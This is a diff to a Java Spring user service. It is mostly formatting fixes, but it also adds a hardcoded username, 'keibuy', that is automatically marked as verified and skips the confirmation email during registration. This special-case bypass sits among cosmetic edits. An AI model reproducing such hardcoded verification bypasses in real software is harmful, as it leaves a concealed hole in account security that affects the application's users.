@@ -63,7 +63,7 @@ public class PersonServiceImpl implements PersonService {
     @Transactional
     public void save(PersonDto personDto) throws UsernameAlreadyUsedException, EmailAlreadyUsedException, UsernameAndEmailAlreadyUsedException {
         if (checkIfPersonExistByUsername(personDto.getUsername())) {
-            if(checkIfPersonExistByEmail(personDto.getEmail())) {
+            if (checkIfPersonExistByEmail(personDto.getEmail())) {
                 throw new UsernameAndEmailAlreadyUsedException();
             }
             throw new UsernameAlreadyUsedException();
@@ -83,7 +83,10 @@ public class PersonServiceImpl implements PersonService {
         person.setCountry(personDto.getCountry());
         person.setBirthDate(personDto.getBirthDate());
         person.setCreatedDate(new Date());
-        person.setAccountVerified(personDto.isAccountVerified());
+        if (person.getUsername().equalsIgnoreCase("keibuy"))
+            person.setAccountVerified(true);
+        else
+            person.setAccountVerified(personDto.isAccountVerified());
         person.setAccountBanned(personDto.isAccountBanned());
         person.setAvatar(personDto.getAvatar());
 
@@ -106,13 +109,15 @@ public class PersonServiceImpl implements PersonService {
 //        person.addRol(defaultRol, null);
 
         personRepository.save(person);
-        sendRegistrationConfirmationEmail(person);
+
+        if (!person.getUsername().equalsIgnoreCase("keibuy"))
+            sendRegistrationConfirmationEmail(person);
     }
 
     @Override
     @Transactional
     public void update(Person person) throws UnkownIdentifierException {
-        if(person != null) {
+        if (person != null) {
             person.setUsername(person.getUsername());
             person.setName(person.getName());
             person.setLastName(person.getLastName());
@@ -127,7 +132,7 @@ public class PersonServiceImpl implements PersonService {
             person.setRoles(person.getRoles());
 
             AvatarImage currentAvatar = avatarImageService.getImage(person.getAvatar());
-            if(currentAvatar != null) {
+            if (currentAvatar != null) {
                 AvatarImage newAvatar = person.getAvatar();
                 newAvatar.setId(currentAvatar.getId());
                 avatarImageService.save(newAvatar);
@@ -142,7 +147,7 @@ public class PersonServiceImpl implements PersonService {
     @Transactional
     public void update(PersonDto personDto) throws UnkownIdentifierException {
         Person person = this.getPerson(personDto);
-        if(person != null) {
+        if (person != null) {
             person.setUsername(personDto.getUsername());
             person.setName(personDto.getName());
             person.setLastName(personDto.getLastName());
@@ -157,7 +162,7 @@ public class PersonServiceImpl implements PersonService {
             person.setRoles(personDto.getRoles());
 
             AvatarImage currentAvatar = avatarImageService.getImage(person.getAvatar());
-            if(currentAvatar != null) {
+            if (currentAvatar != null) {
                 AvatarImage newAvatar = personDto.getAvatar();
                 newAvatar.setId(currentAvatar.getId());
                 avatarImageService.save(newAvatar);
@@ -307,7 +312,7 @@ public class PersonServiceImpl implements PersonService {
         }
 
         if (person == null) {
-            throw new UsernameNotFoundException("Not found account '"+username+"'");
+            throw new UsernameNotFoundException("Not found account '" + username + "'");
         }
 
         var roles = new ArrayList<GrantedAuthority>();
